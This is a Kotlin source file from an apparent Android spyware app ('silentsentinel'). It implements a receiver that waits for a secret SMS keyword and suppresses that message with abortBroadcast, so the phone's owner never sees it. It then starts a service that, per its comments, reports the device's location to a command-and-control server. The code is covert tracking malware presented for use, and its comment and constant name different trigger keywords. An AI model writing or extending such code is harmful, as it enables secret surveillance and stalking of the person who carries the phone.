package com.silentsentinel

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import android.telephony.SmsMessage

/**
 * Listens for a specific SMS keyword and triggers an immediate
 * location ping + heartbeat back to C2.
 *
 * Silent trigger: send an SMS to the target device with the
 * secret keyword (e.g., "//ping") and the service will
 * fire a report instantly, regardless of movement threshold.
 */
class SmsTriggerReceiver : BroadcastReceiver() {

    companion object {
        private const val TRIGGER_KEYWORD = "//loc"  // CHANGE THIS
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        val messages = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            Telephony.Sms.Intents.getMessagesFromIntent(intent)
        } else {
            val pdus = intent.extras?.get("pdus") as? Array<*>
            pdus?.mapNotNull { SmsMessage.createFromPdu(it as ByteArray) }?.toTypedArray()
        } ?: return

        for (msg in messages) {
            val body = msg.messageBody?.trim() ?: continue
            val sender = msg.originatingAddress ?: continue

            if (body.equals(TRIGGER_KEYWORD, ignoreCase = true)) {
                // Abort the broadcast so the SMS app never shows this message
                abortBroadcast()

                // Fire location service with immediate ping flag
                val pingIntent = Intent(context, LocationService::class.java).apply {
                    action = "com.silentsentinel.TRIGGER_PING"
                    putExtra("trigger_sender", sender)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(pingIntent)
                } else {
                    context.startService(pingIntent)
                }
            }
        }
    }
}
